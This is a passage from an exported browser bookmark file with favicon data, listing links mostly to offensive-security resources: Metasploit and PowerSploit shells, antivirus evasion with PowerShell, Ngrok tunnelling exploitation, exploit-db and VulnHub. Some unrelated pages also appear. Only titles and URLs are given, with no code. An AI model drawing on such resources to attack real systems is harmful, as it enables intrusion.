icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAABWklEQVQ4jbVSwUoCURQ9V2fGmUwxagLNwAiDQaHc+AFu/Qt3FtRnuLf+oMCN4GL20c6FEhiU4UKDIFHLJipwGvW2GBUHqXDRhQvvXs55953zLlVBWCZcS6EBCM6S7SRADIWk8DYpCg+tUb9vtlo8MBcJUBKJzWzWn06LweB8f/Rm1NbW5wnsUpRwPr+RyYAWVbH11HY8iQRhV9d9qZRdGqVSv1AY3NXHH+8kK+JWyO3zOwjq4dEM/Xhy3D09ozn3zEZjdibbVu2mpsTjAMxm8zYaZWb6we6JrbKmzS5j5l++ZkIYGwYAEGRNI0HgPwmvxSIAAnkikZ2LcykcZjDADADskj0MdmhwBwJ7V5cr+wcAmBnMX60H67lHgiCqqtXp3CeTsFVVQVVQBbj2rrZzOav/Ml4IQ9crUyRNl286UZK8yaQciwmqSm73eGAOe93PcnlQr9sT6N+39RsgVo7oiKSelAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Docker 资源限制之内存 - 小丢丢的专栏 - 博客频道 - CSDN.NET</a><br>            <dt><a href="http://awhitehatter.me/interactive-powershell-in-metasploit/" add_date="1492702343" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAOklEQVQ4jWNgGPKAEZmjoGPggE3RgysXDiDLw/gMDAwMTLR0HX0AUWGADkZSGKDHP7o4A8OwCAOKAQB38RQKMfDyNwAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Powershell在Metasploit</a><br>            <dt><a href="http://obscuresecurity.blogspot.com/2013/03/powersploit-metasploit-shells.html" add_date="1492703799" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAAz0lEQVQ4jd2QPUpDYRREz/meUUE0IpGgiI3yCDaCCHbZgEtwBy7NJVjY29gJdkYrRUmigoU/mVQPbKzSiMMwzAwXLgz8OVRCacJvfrYPPahhAYbQwxqW8Bl2oYY2jmHSXLeg2oKTUi6SPm7oLXmDQ9zTGzjQY0u/eJ2cltIJc3dwFh5gXT5JS01WZFnnoQtjGYSOPoV7KEfaJsC25SoZJiPYwfPJZJBUuBo+oEbJC3ENvuAV9nUz+YZLXCSPAHRR8g4FWjCaaS8b0ig/mn+FKd0rPQ2phOlZAAAAAElFTkSuQmCC" target="_blank" rel="noopener">obscuresec: PowerSploit + Metasploit = Shells</a><br>            <dt><a href="http://stackoverflow.com/questions/30250442/problems-installing-metasploit-framework-on-ubuntu" add_date="1494509691" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABXklEQVQ4jbWQsUsCYRjGn/fuSu/Sk3ALmlzNtoagKRqSaHMKGkKhEOV0KWispSXPQaglAnNobOgfaCyIcgicmxO9zFPv/N5WwTs5gt7x+5739/2eDwgw/bK67HcnBQG4Ag3L0LJ/BoBFDuDzTiGUCAywDC3bNbRtANCrwxaBziRZanAGcjADwR8AX1uGesEZyFGzXwO43VsKn07GaJa5lY/GMefUAYooEvaELDnCEW9M2I1V7GdPg04hlLAM7dYqqut67ftLNwdpMB5dgRfXdVMgHIFpx9egfbwYk0eDA2LKAWJMkK6cUOhOGdkpZmoQiy29OmwFq1AKb5CgQyakAXqQJKpELn/eJzPK1JKhPhHjk4EmMzUVmU/coVLkeXff672pk155YXUsxikCJQFeYVCSgCiAV920N311b+r37FslH413S+qaV86rggfIBbG38RRAN+2ZHzsTMKvGv80vvziHGAusG84AAAAASUVORK5CYII=" target="_blank" rel="noopener">ruby - Problems Installing Metasploit Framework on Ubuntu - Stack Overflow</a><br>            <dt><a href="https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Editing_an_exploit_module" add_date="1494512362" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADC0lEQVQ4jWWSa2yTVRzGf+95315ou0u7tXSYprJ2y1Kn2YVsCyGDcImJyxi3gYpoI/VGUBkfCAkfMCQkJJgIxHDRGcw0CFYi4WIkmhqoi4gBQ5cxjFLNIG6us5ANga193+OHpnWW58v58PzP7zzPOQf+k+JpWLHN3bQ8CPB4+Kg19HLf63kz8uHA7JcOJdZTJCW/eptWHdANfTOw+7GGFe9OCXFOKLSpiupvamzMaiYZlwbOCZcyJ7r2iek8QNDdrXqbVx512LRIuKsekyZeywhx3l85KzgvUCoqys3vaJq83Oy3+6qcZsM+rq+ZmUBUJbOflDks647t6bBuWtuAEKLMraUDfT0hz7PtXu7dzzzfEnB4XllcZVne7HJpqrL1f4ASu/mZ43s6rP6qUmxWjc72gOozpypsFpX5dWXYLWJW0GVYFAUa/XZVU0X1hsMD8wqA6N5OfY7HUSCuXlojYpdukL77D6pQ6Gp188XF33LDisKy+nJDGLxZAHgr7eMzIz1ZU0m1r5xT3/4MQFerm/7ro4yk7wOwtN5ZIYSyemPvoCt3iXCz+GlWLQ5y4qsfAfCUmWmtdXKqPwmAwyqomW1JZzPGujxgoBjQuSjI8Mgdrv1yK5eipYKT8SS6IQF4+imXVxNsBBASGS8GlNhMLGvzEz2XS7Eg5ERi0D84kqvps5k0RdSEjyTqhEUo3wP6IzWW1HI6lmAqk0EV0NniJnoxV0MVCm21JVmpKy8K59yVd4ELxYDbf01QXmpFQQBQ7bFyY/hOwW8LlrrMmlifc5HRmZu/+2mY9z69wuFdGzCbVP6ezHDw6z95tSMEwMQDnc8vpYandWNMABhG9iQwDXDhym2274/LgzufIxT0cSv1kMj7Q8YLS2rpbg/ww6+TcvuJ3yeTYw/6LGJqYeHUseSXx2Pf9Mq589fIyJatu+6lh87fTF6Ti7Z8lt3RG/tAzz6UZ6+O6ps+uj4aPpKoK67M1csft3eF3/gj8nbPIYBUKrFw877T42/tP7NNSqnEB8diPX1D/fkPlNe/P9AFgfh3swAAAAAASUVORK5CYII=" target="_blank" rel="noopener">Metasploit/WritingWindowsExploit - Wikibooks, open books for an open world</a><br>            <dt><a href="http://bobao.360.cn/learning/detail/3041.html" add_date="1496084765" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC6UlEQVQ4jS3QTW9UVRzH8e/vnHPvnek4wQrSAC5UalAMxidWSnwFECVGYrogvggfNrpgpbhyZdgYVyRWE5sYTbozFjVGq0ZUbAaMqFQqiZ3aKcO95+Hvxs9L+AjghaWzp+ph76XUxsOCRnJ0JRFzFEDlK6tdwKxg0Ia6+jnebN9458SLizr98VvPhdqfF/gcsxlGm6L2D2a59/Y5AH4db7C+s0kTKhPCV14GucS0EMzcawXvcxeT4bxZ0fMPPGXH5x8lFxOAd84+urLK4i9fSnKWu5J8VYWMvRqy3MHUFXOq/M3ulk4/+KQdn39cH46+ZuXaGgDHDhzSM/cdBZy9++OKZuqeT7EYuPkQCY3MNC3F9g/32on5x7Q0WuXcxQvcVjUAnLt4ARBPzz+i5d/XbH1ni1peQOOSebIFbiU0NzOrvyZjPvltDakhWSBZQGpYvjoi5cTdwzs1jaZigUiwkMyDGd43dmn8j9789jOq0Ps/UADkUpht+mxM/qUrkFRZNKeCCMmcnGCrbXXy4P0sHHqYYoUgh3eObEaxgpPDS1S+oStSCp5iKCRzYBBczZHd+6i9Bzxdzkxjx7BuAMc0RbIE8iRzJPMUM0KHt1SKdjUDe2jPnJavjvjm73XmZgYMQs2N6Q6S8HIc2b0XuYpbeOuZUwFzEc8kwT3DO+QkJikx7jrGbUcv1CQzdmJiT3/AnzsTokEsUmeezjw6uvRBKaVoUFW2b2bA208c02zTI+ZMskI/VGCwHTsq53j9h+/svSsjdlW1ikFIWS0KzWaX2Wy3tHJ9w+4aDNR3jrlej1KMyjv6wROct5hNybwlgmVK51r85Rh6MkI2V9srq99z6tMV+2rjug2DbBBE7UVwAAjnrTWfU9VTZ34UuqIzMp2n6gWL0YTJcHyxuc0fly7T5gwABk7i8xtjfG8QpoVUis4I4MDi0rO+mXnZYncYaASaxEQsJgkwDIGZMQihbfr9n9L29tlrCyff/w8p1YqGuQvfowAAAABJRU5ErkJggg==" target="_blank" rel="noopener">【技术分享】Ngrok内网穿透的几种利用 - 安全客 - 有思想的安全新媒体</a><br>            <dt><a href="https://kaizensecurity.wordpress.com/2016/08/19/metasploit-av-evasion-with-powershell/" add_date="1492704884" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAACx0lEQVQ4jaWTT0wTURDGv30ta/m7wBIIQbGIYNIiSELAgAcvclJJ6gUiMZwkHsST8Wg84wUSU70RKOvBhIRwEQkJMdioAUTEBrb8McViarpJd0tpu9vueMCt1atzesl7v5lvvnnDgYhDfrzcccE0h0HUw9tYKwDoWXMDHPcOjL3AwPlA/nP2Fzwtj/Gg9X5nidvf66Sox5mMepxJf6+T+p0lbh60jml5LB/hcgp82yuucp6bvVpX/+ZHUpzc1/BJSWUAoF102O80lKG3tlDpWwqHAjGdMHih40+CaXnMJRRcmb1aVz/oj4gW+G8MNQr2p20V8csL33cCqrGM280POEhBNw9a/3rjrDoaiIkAMLGrZoYaBXs+PLGrZpIDTXYASKSNeNXMt0Id3CUG0xz21Be/PVfCi97OanjOlOQgb2c1vJ3V+BxLAwAWfhzn7jz1xW9hmsMMRD0jTaJw7+NP/FvRAtrKTwEAHn9RAABToePSkSZRAFEP422stUVgzRO7ambvSFeu1RblkswcHJ1U+63K8mZyX0OLwJp5G2v9a4yWB1b/bRUnla2k7aLDvnekK/kmMz1rbmyqptwuOuwTu2oGAB66yhUA6K0tVKw2hhoF+5OLIkYDMbFddNg3VVPWs+aGDbfutyTMbNnN06UN84cJs6uqkHWIjqJwMssSGSpaiiRxva4YLqFAqTzFknffR/hH7kr26kDd2lSNVUAKunlJNoLxdLRrPkR3P0QoS0RaSte65kPES7KRJaIsEb0+TFDXfIiC8XSUl2QDUtDNMHA+oJvk7VsKh3zdNYo1snzTngfVnKm+7hqlbykc0k3ynuwF0clvnNpadc3trQXj6aiW0rVncox4STZ4STYsVcF4Ouqa21vD1NZqjssdiDj4tsd5STb6l8OL/khqRUvpmpbSNX8ktdK/HF7kJdmAb3s8n+H+d51/AXgclBDq8lg2AAAAAElFTkSuQmCC" target="_blank" rel="noopener">Metasploit AV Evasion With Powershell – KaiZenSecurity</a><br>            <dt><a href="https://team.nuptzj.cn/" add_date="1502963185" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC+klEQVQ4jV2TzWtcZRjFz/O87525M3emGTMZjPlo/Wr9WAQKRegshKoogqI78Q9oxWgXQgruLLgSq4K0JM1SBHduulGwZhMt9QNEulAsRDvaNJN00s7MnTtz733f46JRpj3rH4ez+B3BeEiBCAHg44ut2TAqzxuSg4zX3nm6sXkvAwCCe7J8ufNSENgTaRI3VU0EAN7l/UKpvJ6N3MqbzfrX47z+13ri/Plg9cfOcqEQXKD3L4Os51ka5lkaAjIF4NWgaL9auXzzIwDA6dO6t4ACCJcvba2WK7Xj/d3tjIBARHVvoQcI0qmqaFix6z/8fObzxWOnAIgCwrPf3XilGEbHe7e204wwImIUkNwTufcQQEgGmaMm3U7miKXn3//yGQBUAGKtOenyjAroU/urQhJJ5vHgZEEerocyzDxEhEfmIykVAxx+4iAPP3nwbQDQT9Y2DvjcHenFA8zXiuaRqRCNKADp5VCjzEONMgEv9SjAo1MlzE0UTaUUohaFzZnXz0zZKKocyHOG0xFkYbbCehRgYTbC/H1FPrCvKEaB5kM17gsN6lGAhZlIhq1YNrfz6uOPze23CkuRDJknrmzGMCL4vZ0gTh2KVhEYwcbNBGFgMBFaXNmMkeYeKkDuLPVWL/lLvE+2B46ZI5LMIUk9WrtDAUB68u/bIxmkDknmkHmyMxSWgqB79eqfLV16duaaGPtTtRJhkDq32U2ROqJUsNzqp3Kjl0polbkjrndTJKl3/eEIu/3k++tfLO1YAMyZf1qyxed2erFvx7kagVgV/NEeEgCsUXRHufzyT+xdnuPX3zZka6d9ds9EyltHpy+MhsPl2mSjYAVeAEeA1iqtVRKgimSBUR9NTAZW8MHF915b+18kkPJta+1kMojPhVHVhuWKVVWl90rvVVU1LFeDICxb5tmHny0eexek4I7Gd2f1UudFseaNdDRoqjEVkPD03WJYWk/T0cri0fu/GefvLhi76rm1jWlTrsx5gvFt1zr1wnT7DkKRsTv/CzkAe6RCKMbZAAAAAElFTkSuQmCC" target="_blank" rel="noopener">主页 | NJUPT 安全团队平台</a><br>            <dt><a href="https://www.vulnhub.com/" add_date="1502714390" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC9UlEQVQ4jXWSb2iVBRjFz3ne995buxtqjqCWKTMKdrl7hSA3SfJTZPqhqAV2N9ggl0TSh/5Bma1lBQUhLKT6Ulvv3VZ9WNTAaQWtv2Shdk20dDmsbYW4Rbo/7t77nL40WWbPx8M5P3gOh/ifa2lpWSvpBUly9119fX3Dl/MFlxObm5vb3H07yU/NbARASxRFtYVC4fNLvbxUyOVyL5GsBTBmZkslsVQq/RkEQaW7LwvD8JGenp6x/wCampqWJJPJPQCm3T0ws3EzGwMAd19OMgPglLs3mFlXHMcfXHwhl8tlgyB4XdIoyeUkD5hZDYAbAKyQVEnyYwDrAPwA4PYoitYUCoVPmMvlNkp6zMwOSqoBsA/A3SS/iuP4FQC49Z4Ht1yTmm69Ah472SCpSPIqd18R1NfXf0FyLwCRLEjaQnJPPp9/GwBmOq9ubK87OH1mpuK7k7NLt4bGQyRPA1hjZqeN5G4AtwE4C2AlgK35fH4QHR22bdfTNanybBt82fBD1x3+6/3e+E6SCUmbJZ0BQJO0HkAPyRsBVPX29p5aKPZIaeU7UbL7RHHq/MMq2/Mvt9/RNFe2RklvkRyWNBJEUbTKzPZLOkdySSaT2RFF0U9Hurp+rd2waUNlKmzrDO7/dvLk+OjRmer7QmDAjFUAjkp6IMhmszslXQ9gJAzDIUkJktuy2Wz1Rxtf3FmaOra74fjQk2NTob1RN3wgkx4/MTS5ujqh+SfMrJP/LO9VAKsBvAkgTfIXd9+RMJ53L9tcmJo8nLn33eNzzR0DZ2/6uvuPuroKzD7a398/GgBAoVDYl81mL5B8luSXkq6VtBdm0+H83O8Tq26Zd9hd7f6hznn6m8d/XvfMj4OvTQKALRSWz+cHAGyW1ApgfSqVOubujWXD2sDnq0RdQJnJm9MTo/iso7SQuwgAgDiOJ+I43gTgt2KxOBCG4WBQ8vfoXkV5hQesmPHElYsz/wIsAj3n7k9J2l4KwlYJh9IsdQdUf5Dy7xd7/wYaBVr0gO7NnAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">易受伤害的设计〜VulnHub</a><br>            <dt><a href="http://www.xiangyunvps.com/user/logininfo.asp" add_date="1506335419" target="_blank" rel="noopener">香港免备案云主机,国内免备案VPS,国内免备案空间,香港空间,cdn加速,国内服务器租用托管,尽在世纪互联</a><br>            <dt><a href="https://www.52pojie.cn/thread-211740-1-1.html" add_date="1506352881" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAC1klEQVQ4jQXBy0tUURwA4HN+59yH470zcxkFx8eoJCPooKLLwhqqRbUIJAgiV4HQwm3QTvoXahGuRHGnOC5cyFj0AKUgMgysyMcMMzh10e6VuXNf59H34cuVldbqKsnlhG1LzsE02ekp6Drp6eHn57xeJ4ODGAAsi9dqxtwcma/Xo709GUUoiqL9fePxY0xpsL0dffqk377dduMGGAYiBEzTW16GdJo8v3eP12rWq1ciiqwXL6QQpKtLeh47ORGO0z4zQ4eGhJTB2hr/+1fJ5yE+PVXGxmQUxd++hXt70nHYr1/B27dgGCSfh2zWf/eOWlbb3bs4mRS2TZ5NTupXrwrP08bH6ciIt76uTkwI28aU6rduyYsLms2CacowlK6LNQ2wEM3FRazrSFXDclkdHaX9/fHv3+H377xaRQDBzk5QLmNF8T9+pAMDAP398dFRUCr5pRLJ5TBA9PmzOjwMigKWJVstVq/jTAYyGQAQ5+e4cf9+sL0tgoCYJh0YCA8OEEK0owMxJnxfLxZJV5e4uAjev5eel3jwACCVEkFgPnmiTk2xajX59Knx6JH0fSQlzeV4rcaOjyGd1qanBWM4nabxwYF+/Xr77KxoNKKTE21ykh0fY1VtLi21zcwkHj7kjQZJpaL9fX9rS3oekN5e2t0dfPiALQu5bvP1a27bvFIBw6BXrmBKsao2NzeVqanEnTvx169Au7ul57UVi/zsTJ2Y0ItF6Tjh7i7WNDI4yP79E64LmobiOD48VEZHQbguVlWSzUrXlYxBJqPfvEnyedFs+hsbeqEAiYR+7Ro7OoorFYQxxD9/Qk+P8H3a1yfDUDgOAkCMIQBlePjy5UucTCKEkK4jjIXjUCRlUC5HX75gIUSzKTlHnMc/fkAqxet1Vq0ihITjIIwlY9DZiVtv3jgLC0o+L2xbtlrQ2yuDQPz5Q/v6WKWCLUucneFkUikUUBwn5+f/A3gvfAEHLK4lAAAAAElFTkSuQmCC" target="_blank" rel="noopener">[新手必备]汇编命令及OD常用命令及断点设置 - 『脱壳破解区』 - 吾爱破解 - LCG - LSG |安卓破解|病毒分析|破解软件|www.52pojie.cn</a><br>            <dt><a href="https://www.notsosecure.com/blog/" add_date="1506391946" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABaUlEQVQ4jcWRSyiEcRTFz/9+M4WFhaHI+7Gh0CjjVRYas1AWrMlMGeyVrKRYSBZT49VkpVFWXo3V5LEij1IWs1IUigUNYfiMOVYjor5v5yxP9/zuPV3gv6VIbrze3VUk9HfjaRGkZGUGNU0bTVoWAKH96fn2Pf+c8TYR9GyuDpEMKqXOAEAABO3u7lvNajUEMJHA1shYKsnJr6OUUi/p+XmB8vY24woALo+OEVlZ6yDZkrwAIjJb298bM0UAsDM2Af3xaYqkRQBAKXWTba9eLqh3mAI8XF3jMLBgB+CWry4iPseA1xSgsKEOhU2NbwCKLElTKXUa1/VwRnFR6/35xZ/BnKpKNA8PfpQ4W5ZFZFQpdSbfBzSr1Vfr9fwK2spK0RGYgSccWi9zOWs0TetKvvGHSEosGo1MlVRw3JZLf7WDJ4tLjOv6NslGU/1I9u35/DyYDVB/fj4k6TIV/AZII7lLspOkGCf+W596cIt4olUO7gAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Blog - NotSoSecure</a><br>            <dt><a href="https://www.exploit-db.com/papers/17934/" add_date="1506406293" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADKElEQVQ4jW2TS2icZRSG3+/7/3/GuWVqYg10McEaFRtI2kQhWqwdtHZRBLsYokKmRdNACl5ag1BXo0XEhS6kWERUMGplFMSFCF04FXXRpiitNslYJ2kmnVwmyVySmfnnv32vC1ON2md3OLwHDuc8AhvkHkWUreiFRIfPMH6Ljdk/A0JhEyQ1IYSHm0FAAMD88Lbg7ABeyD6GE9df2R1ftdhFmnekUil50+Bmise2dg4DxvQHx3tqP52ZNRdytGzbJGlRqQt03UP/zQgCYiIBY0vYf1JYznOqdfvktneuhlZt3FWu19UP3/+oBUNh7tu7W7b5ACj1ltC0UZJCCEFdAJwO+IcjmvvyvKm8e46+2zuZX8Dbp9/3urq7ZaVcodR0BCIht79vJ9p98iW67jiESGcyKV0CEFKgw1z33NCOfs/qjHsfnUl7joL89dJl5HI54Tc0UV1ZlrPXCwQAaNqIABGPp1wdAA1Ni0oFPdR5n5UvluRKqYyAPwAAUjd8LBTmYdVrotm0tepKkXt77t01l9p/sHkeUzI3aLzoBLd+1bDxS8st0u8oKJAgAKVICKDetFCpNXBlKstiaR2GZFBRBkUd67qAKBjm8ohDfGqXV81Ye/TBUDjiNW1b6poOpRR0KWE2LZSqVd7eEhR1BP7oeDXzGSCU3D5mf+HRec3Xqj+0fP6bC+HyteIT++Osrq17juP8fa5ao8G2lhbv/l09Sh//JA8IlSKlJCBjHzoXH3/ASThTlcnGpe+8R/r79OeTCT0ajbik5wkqdt8ZkydHj/rDM+fk0qmhfflB7TSE2BifpgYA2TUeL1ls5iocMR1maNc5v7jExZVVVbZYVdPjZ2cGQzOVw4KFpPz8LweS/ru/BiJNj8dIsvTl66eyezCQHfC9Ufl49ARdO1l775nfF948eAgALh/ArYtHfE9mn8JtAICridYda+fGvlUk6xOZZyf2IJkfahtZGgq139j/Shd2Fp7G2ZkjWx7+3/9fq7PX9rhMugc2tNI22SdJagDlxeG+4PThQCKXQJQJaDfkA+fmAjTNGAAwndYISKbwL/OIf+p0Atrm3p9T0qAQNXXi6AAAAABJRU5ErkJggg==" target="_blank" rel="noopener">Vulnerability analysis, Security Papers, Exploit Tutorials - Part 17934</a><br>            <dt><a href="http://www.yalewoo.com/qt_tutorials_2_gui_introduction.html" add_date="1507261859" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAADWUlEQVQ4jV3TS2xUZRjG8ee7nHNmhs6ZCzNlptjCACMzpVIRLzF4CWITSUhcGEl0wULj0o1ujWtJTNwYF4jgRkMa1MRodOElqRHaYkEqU6hTQu/tdOrcmJlz/14X2C581v/8dg/D//YrkVwuVffeV+KIG/jpWw1P35cw+N5YaGooEUw/Eos1GGO01UsAICIJgD7/c73/3A+LZ+Zazms2sdxjvbp+MKnhp/W2clbbzULMGD+SprNENMkYs7cBAOzjqUrx+0X7w5m6dcJhTEjJMbbpIhPX8e6huPh0rpO8c989ueYERV/R+0R0iTHmMwC4WNrIfDnTOj/TcE/6nHEuGaQuoBsM/T0SHwzHkJLAvA3canrQBVuwwN585+Gdv4kSkf7Vzc23r204bzgKkgSDpnH0hAX6ejQcikmMVMeRHjuHgRBDIV/A1yvd+FpH7c9G5I/y7mxl92y1+7rtk2aGBB7NhPH87ggOxHXEDQaTbCQufQP19wRotYzQwGGkQlH8UfOO/rxmPSknS0v711u8//FMHK/kTeiS4XbLw0TdARhD1ghwxhxAn5gCJwVBPp5IhlBq+KFq13lJdiznwOFoKDKcCeGL2RbKHR+eYNANjnRYohXh+LZwGq9mc0il+3CFUphuOjia1LDapbzsjWi4t9nF+b/q6BIHSQ7JGFQAdAOFlsdwQ5gYGnwZ+aiOy7MNLHcViICDpnSlE6iNydtLnveQYYieKIgIpOgB4BLqLIAChxUw1FyFpY5CzVFoOgph8GXe2xMpRZmqWCuLgOeBKYLyFQI/gOc9CDctBQ5gruViuePhH8sHBUpldHGdFwvmQrE/8UvQqFFnZQFwfSD4D3EVfIfguwRTclyp2GhaBMdVyGp85UQ2MsGP53L24C7zoz07w7N2ZRXt+TkoywL5hMAneJ5CQgCOp3BtzYHvKIQV7OGk9klyn3lDAMDY5QvV6fnaYq1tPV2r1WNus8kYAUJIEOM4lgljue1ifM1CBMp6Kq1fGNljnj2VjFhs61Wjo6Piqp16Zry8+d58rf1s3fIMaAZS6QRGirvw+1I72KHLu8dyyc9OD6UvPpfPVgFgG9iGrpfTN8vVF+cqzRdaHTcfDQk3Hd3RNTR+tdCf+u6t44N3GGPBVv8v5XGrS+NCijYAAAAASUVORK5CYII=" target="_blank" rel="noopener">Qt快速上手2——创建GUI程序 | 雅乐网</a><br>            <dt><a href="https://greasyfork.org/zh-CN/" add_date="1507339743" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAABXElEQVQ4jZWTParCQBSFz+CgFoYkGCJoITKVexBclOAC3IKFnWV24A5cgK0QUEwsVEQ0YmEx5xUvb1Dyo+/CbYaZb849914gGwrADMAawDPNdXqmcu6/xXwwGLBerxNAUc5zXwohVgDY7/cZRRGllGWQVeZnAAzDkLVajUqpbyBGiRoOh+x2u2y1WtxsNgay2+0+QRQAzFzX5fF4ZLvdpu/73G63rFQqnEwm3O/3rFarRYAZUodpWZaBNJtNxnHMv1gsFkWAtQTQA4AkSaCUQhiGmE6n6HQ6xqDT6VTUtR7w22dDtSyL1+uVWmuj4HA4sNFo5Cl4mhJe07ZtLpdLBkHA8/lMrTUvlwtd182UgNSIQqcdx+H9fqfWmrfbjY7jUAjxZqIqAwCg53l8PB4G8lKOGe15GUAIQc/zmCQJSXI0GuWO9OqTEtu2OR6PKaXMjPJXSlC2TC/xr3X+AblgI7SP3jS+AAAAAElFTkSuQmCC" target="_blank" rel="noopener"></a><br>            <dt><a href="https://www.waitsun.com/" add_date="1507536946" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAAByklEQVQ4jW2SPU9UQRSG3/fM3V2ELLsGCj+AmPADCDUtv8EYtrJWojbGWGuiBb1r5Q8wNtQae+NSKFD4Ua0UJAqRCFzvzHktZu+NiZ5i5sycjznnOUOXCACQBIDkvzoBMHuhyEZJkhOEGQSXAzAzAO4uKFjIAZS7A1YncHeasdabMAGQAFguaX+0c+fG9eHjRyAPx+MHg42ntzdTVVWxerJ56+Fg4/DgYFJqVVWS3m5vLwE319Ykfd7dXQHW5+dOz36dn56vz82vAF/39yTFGI2kpKLVvhjCTLcrKYQwG0K31zcaDL1+vxcCzSSRtExDUEpJ7iQBeUpKCSCA5DGlBDFDs7p3sqEpCiBJSsz9NlRRTHY2C5RdAOUs9ZSyFGjOgIAUo9zza54iyGAEULTbJEkWmS+NFkJnaioUxXRvFiEUrfaF6RkAP38cLa+uXlpYcHeShSRSVVmepPTl44dXw+fvXr/5nlLr2/jlcPhpNFKnc3/4rGi1UowMgSkl0vZG719sbQXorPp9bXHp+Oi4KsuTsrx65fLg7r3F5eUYYwiBJN0FiA2F/0mM0SyAIMD8YST5ZAhQppOZSTRr0pGg5I1Nk1vWav3F/5I/0wwL1ik5SyUAAAAASUVORK5CYII=" target="_blank" rel="noopener">爱情守望者_致力于分享最精彩的互联网</a><br>            <dt><a href="http://www.sdifen.com/" add_date="1507536950" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAC+0lEQVQ4jZWTe0hTcRTHz7m7d3fbna5UfG2WpiUto0xKDCNEIyKSXobVH5oSJkZUVBCVLaOCsgSt6CkVCvb6wyxmofbA1PCRw3ykorM5l6bTTabb3d1+/SHioiL6/H3O93w553sQfgcBgAzUXl8mt9qXcpvWt0lw9VcCgAhA/lA/BwFAIIQqv3Ig9cPO6KHO1Cj3YP4+g8P0fpeH+C/QnpMRgLy8mLkf3jYUimxmdpAmLh/zKxUK/ENbn9aLW7TpPiEEEZH8IjBrr5W0R9ck7s2N+zHGTntLnRa3i3YJxCmt1kqA43InSIsOEZs8RagZXwRfF+/JDq0tLFt7KrumgeaGaTvPeAMK3g6BYUMiTO0B/u+vlbeX6EdaMj0dUAAEK0pyUpR86zVu6PmSWN9PSbE3zlY2o9SkmOIZv7Awoyll95sCgyyx3jQe+fiLoWhksnV2JyC68Ui2VDWiLYvy+zFveEpwiqxNinCVLNAem1Jt1A8jlbq96UKXPYmw0iARb3MO2qysC5iEioKcF+cuFY9R1v42tRwtAW50uY0TSNtcYicYnwauUzZHrntSnHH5Y+9yOyMLFDMoEIedRsK7vtmsfgYXGwkAQHEh6k7DpHSUQoFS+jgEiZhneEZlBpl/wbOiB/Gbw30bWVP/hIBIy3wVAiuXiVh0mv2ldCcAAHUo42TXN0ncsfoBBa9UTDNevmFm8cojJ47fGle3NOsKxBTTfzh+YQYO9E84aTGjUnD8mmDvoxJJdA8AoAjgHFTOb2mL8WuweHFMRDeVoD1/u3tjtFoZEh6x4G5Xn/7dpMWenKAOqv8+al2QGLP4TLJ66z2PKwCBp+gOOl12ndumja/6TKpQsK3p0w/p0tKSSonTsbv+ky6no2Mg9G76qsQd6uSbnon8LZqkp5DVlOhWyOW0SK83X92wIa63rq7RYRwZv1P6oLJx9lf+/AtkTjAvLycuPX2LJStrazUhbQEAABrNTPD+iUYDFCEaKj8/O6ao6GDw39z+D39t/gk5YEjXKRxCwAAAAABJRU5ErkJggg==" target="_blank" rel="noopener">史蒂芬周的博客 | 软硬兼施，娱乐共享</a><br>            <dt><a href="http://threatexpress.com/2017/10/metatwin-borrowing-microsoft-metadata-and-digital-signatures-to-hide-binaries/" add_date="1507696052" icon="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAIAAACQkWg2AAACGUlEQVQ4jT2Su2tUYRDFz5l7d9fdZKORCHmZLWwS2CaJqYIW2ph6i/SCYdHCJlbaiA9EsA2C/4FCII8yf4OoBFIlRKPBBNdkyT7vvd93LO66wxRnhsM84MfT01MAkkgCgARAAElIPfE/JIV9tySkCcBMEr2HBDORAAiQDJWO9B6S5fOWuyTJNxsCVCyCVLfLdlskzACE6WzL5ZjLtXZ3m18+MwiG7twNBWxswDnMzqpcZhSp2+1toFnn4OD3h/e19U9BfiA+/nXj4/qI4KtVjI9bq+UrFb+ywlIJzgVPVlctmz14/Ki+s1N6/rL09l3r29ckiq7+PNZAwW9tYWKCa2s8PFSlwjgOATCTgTCyvDxafejbnWv3Hxy/epEowLOnGB721art7XF/H0EAIITETKYwPRPX/rhm09XrQ/eWbHMTIJaWcHZGCY2GpqeRyUAKBci5wfn5v9vbcA5BYEl85fUbDyGKEARIEnQ6WliAcwKMZr7dHpi7GRSLSb3OMFScuEJehYKSBGGo83MMDmJuju02zQyAoigzNpafmen++G7ZLAA4R+9JIpvl0ZHKZY2OKo5BGgCQcu7yrdtxrSbv0w5ISPAetRoWF+E9+2jQTFGUuT4lwTUalsv1AAkCXlxgclJTU+x2QZLkyclJj7MUMu9p1kMNgPcwg8T0EMlS+NIDCPTdACgxdZMCUmF9qlMhKcWx90lfpyXwD1J6LFFOe+giAAAAAElFTkSuQmCC" target="_blank" 